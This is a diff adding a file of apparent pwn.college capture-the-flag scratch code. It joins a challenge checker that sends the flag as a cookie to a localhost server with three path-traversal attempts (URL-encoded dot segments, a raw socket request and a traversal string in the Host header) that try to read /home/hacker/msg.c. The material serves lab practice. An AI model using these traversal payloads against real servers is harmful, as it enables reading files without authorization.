@@ -1,0 +1,50 @@
+#!/opt/pwn.college/python
+
+import requests
+import psutil
+import sys
+import re
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+print(f"Visiting with a yummy cookie...")
+r = requests.get("http://localhost:80/hacker_manifesto.txt", cookies={"flag": open("/flag").read().strip()})
+print(f"... retrieved, in case it helps you debug: {r.content}")
+
+
+import requests
+
+url = "http://localhost:80/%2e%2e/%2e%2e/%2e%2e/home/hacker/msg.c"
+response = requests.get(url)
+print(response.text)
+
+
+import socket
+
+# 构造原始 HTTP 请求
+request = (
+    "GET /../../../home/hacker/msg.c HTTP/1.1\r\n"
+    "Host: localhost\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+)
+
+# 使用 socket 发送请求
+with socket.create_connection(("localhost", 80)) as s:
+    s.sendall(request.encode())
+    response = s.recv(4096)
+
+print(response.decode())
+
+
+
+import requests
+
+headers = {
+    "Host": "../../../home/hacker/msg.c"
+}
+response = requests.get("http://localhost:80/", headers=headers)
+print(response.text)
